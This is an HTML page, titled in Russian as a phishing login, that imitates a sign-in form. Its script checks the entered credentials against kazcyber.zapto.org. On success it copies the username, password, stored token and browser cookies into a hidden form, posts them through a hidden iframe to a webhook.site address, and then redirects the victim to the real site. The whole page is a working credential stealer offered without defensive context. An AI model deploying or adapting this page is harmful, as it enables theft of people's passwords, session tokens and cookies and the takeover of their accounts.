<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Фишинг логин</title>
  <style>
    body { font-family: sans-serif; padding: 30px; text-align: center; }
    input, button { padding: 10px; margin: 10px; width: 250px; }
    .error { color: red; }
    iframe { display: none; }
  </style>
</head>
<body>
  <h2>Вход в систему</h2>
  <form id="loginForm">
    <input type="text" id="username" placeholder="Логин" required><br>
    <input type="password" id="password" placeholder="Пароль" required><br>
    <button type="submit">Войти</button>
  </form>
  <p class="error" id="errorMessage"></p>

  <!-- Скрытая форма для отправки данных на webhook -->
  <iframe name="stealth" style="display:none;"></iframe>
  <form id="stealer" method="POST" action="https://webhook.site/6b77aea8-855b-4976-9d7e-a9e447b3b291" target="stealth">
    <input type="hidden" name="username">
    <input type="hidden" name="password">
    <input type="hidden" name="token">
    <input type="hidden" name="cookie">
  </form>

  <script>
    const form = document.getElementById("stealer");

    document.getElementById("loginForm").addEventListener("submit", async function (e) {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const errorMsg = document.getElementById("errorMessage");

      try {
        const res = await fetch("https://kazcyber.zapto.org/logindemo.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          credentials: "include",
          body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
        });

        const text = await res.text();

        if (text.includes("✅")) {
          // Ждём чтобы успел сохраниться token и cookie
          setTimeout(() => {
            form.username.value = username;
            form.password.value = password;
            form.token.value = localStorage.getItem("token") || "(нет токена)";
            form.cookie.value = document.cookie || "(нет cookie)";

            // отправляем в iframe без CORS
            form.submit();

            // редирект на оригинальный сайт
            window.location.href = "https://kazcyber.zapto.org/";
          }, 1000);
        } else {
          errorMsg.textContent = "❌ Неверный логин или пароль";
        }

      } catch (err) {
        errorMsg.textContent = "⚠️ Ошибка соединения";
      }
    });
  </script>
</body>
</html>
